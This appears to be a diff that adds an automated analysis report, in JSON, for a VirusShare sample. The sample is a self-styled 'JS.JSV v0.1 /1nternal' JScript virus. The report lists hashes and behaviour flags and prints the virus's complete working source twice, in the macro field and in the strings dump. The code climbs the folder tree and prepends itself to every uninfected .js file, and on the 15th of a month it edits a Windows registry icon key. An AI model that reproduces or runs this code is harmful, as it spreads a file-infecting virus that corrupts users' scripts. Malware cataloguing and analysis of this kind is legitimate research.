@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "SYSTEM": "May run an executable file or a system command on a Mac",
+            "Shell": "May run an executable file or a system command",
+            "WINDOWS": "May enumerate application windows",
+            "WScript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "// 1nternal\n\nvar FSO    = WScript.CreateObject(\"Scripting.FileSystemObject\");\nvar cpath  = FSO.GetParentFolderName(WScript.ScriptFullName);\nvar fder   = FSO.GetFolder(cpath);\nwhile (!fder.IsRootFolder)\n{\n\tvar fder = FSO.GetFolder(cpath);\n\tcpath = FSO.GetParentFolderName(cpath);\n\tvar fc = new Enumerator(fder.files);\n\tfor (; !fc.atEnd(); fc.moveNext())  {\n\t\tif (FSO.GetExtensionName(fc.item().name).toLowerCase() == \"js\")\n\t\t{\n\t\t\tvar fv = FSO.OpenTextFile(fc.item().Path, 1, false);\n\t\t\tvar TestString = fv.ReadLine();\n\t\t\tfv.Close();\n\t\t\tif (TestString != '// 1nternal')\n\t\t\t{\n\t\t\t\tvar TempFile = FSO.GetTempName();\n\t\t\t\tFSO.CopyFile(fc.item(), TempFile);\n\t\t\t\tvar fr = FSO.OpenTextFile(WScript.ScriptFullName, 1, false);\n\t\t\t\tvar fw = FSO.OpenTextFile(fc.item(), 2, true);\n\t\t\t\tfor (i = 0; i < 44; i++)\n\t\t\t\tfw.WriteLine(fr.ReadLine());\n\t\t\t\tfr.Close();\n\t\t\t\tfw.Close();\n\t\t\t\tvar fr = FSO.OpenTextFile(TempFile, 1, false);\n\t\t\t\tvar fw = FSO.OpenTextFile(fc.item(), 8, true);\n\t\t\t\twhile(!fr.AtEndOfStream)\n\t\t\t\tfw.WriteLine(fr.ReadLine());\n\t\t\t\tfr.Close();\n\t\t\t\tfw.Close();\n\t\t\t\tFSO.DeleteFile(TempFile);\n\t\t\t}\n\t\t}\n\t}\n}\nvar TodayD = new Date();\nif (TodayD.getDate() == 15)\n{\n\tvar WSHell = WScript.CreateObject(\"WScript.Shell\");\n\tWSHell.RegWrite(\"HKEY_USERS\\\\.DEFAULT\\\\Software\\\\Classes\\\\CLSID\\\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\\\DefaultIcon\\\\\", \"C:\\\\WINDOWS\\\\SYSTEM\\\\Pifmgr.dll,32\");\n\tWScript.echo('JS.JSV v0.1 /1nternal');\n}\nWScript.echo('JS.JSV v0.1 /1nternal');\n"
+    },
+    "filename": "VirusShare_430d9610fb702816100ff1af51288d6c",
+    "filesize": 1497,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "430d9610fb702816100ff1af51288d6c",
+        "sha1": "62615496148c2dd16d10fdce6e5d7b84ab5fad7c",
+        "sha256": "0c3096d1f4a5564125da17b71f28fb719b569afc0c610c70a43e9af0544b69dd"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "// 1nternal",
+            "var FSO    = WScript.CreateObject(\"Scripting.FileSystemObject\");",
+            "var cpath  = FSO.GetParentFolderName(WScript.ScriptFullName);",
+            "var fder   = FSO.GetFolder(cpath);",
+            "while (!fder.IsRootFolder)",
+            "\tvar fder = FSO.GetFolder(cpath);",
+            "\tcpath = FSO.GetParentFolderName(cpath);",
+            "\tvar fc = new Enumerator(fder.files);",
+            "\tfor (; !fc.atEnd(); fc.moveNext())  {",
+            "\t\tif (FSO.GetExtensionName(fc.item().name).toLowerCase() == \"js\")",
+            "\t\t\tvar fv = FSO.OpenTextFile(fc.item().Path, 1, false);",
+            "\t\t\tvar TestString = fv.ReadLine();",
+            "\t\t\tfv.Close();",
+            "\t\t\tif (TestString != '// 1nternal')",
+            "\t\t\t{",
+            "\t\t\t\tvar TempFile = FSO.GetTempName();",
+            "\t\t\t\tFSO.CopyFile(fc.item(), TempFile);",
+            "\t\t\t\tvar fr = FSO.OpenTextFile(WScript.ScriptFullName, 1, false);",
+            "\t\t\t\tvar fw = FSO.OpenTextFile(fc.item(), 2, true);",
+            "\t\t\t\tfor (i = 0; i < 44; i++)",
+            "\t\t\t\tfw.WriteLine(fr.ReadLine());",
+            "\t\t\t\tfr.Close();",
+            "\t\t\t\tfw.Close();",
+            "\t\t\t\tvar fr = FSO.OpenTextFile(TempFile, 1, false);",
+            "\t\t\t\tvar fw = FSO.OpenTextFile(fc.item(), 8, true);",
+            "\t\t\t\twhile(!fr.AtEndOfStream)",
+            "\t\t\t\tfw.WriteLine(fr.ReadLine());",
+            "\t\t\t\tfr.Close();",
+            "\t\t\t\tfw.Close();",
+            "\t\t\t\tFSO.DeleteFile(TempFile);",
+            "\t\t\t}",
+            "var TodayD = new Date();",
+            "if (TodayD.getDate() == 15)",
+            "\tvar WSHell = WScript.CreateObject(\"WScript.Shell\");",
+            "\tWSHell.RegWrite(\"HKEY_USERS\\\\.DEFAULT\\\\Software\\\\Classes\\\\CLSID\\\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\\\DefaultIcon\\\\\", \"C:\\\\WINDOWS\\\\SYSTEM\\\\Pifmgr.dll,32\");",
+            "\tWScript.echo('JS.JSV v0.1 /1nternal');",
+            "WScript.echo('JS.JSV v0.1 /1nternal');"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.279952",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
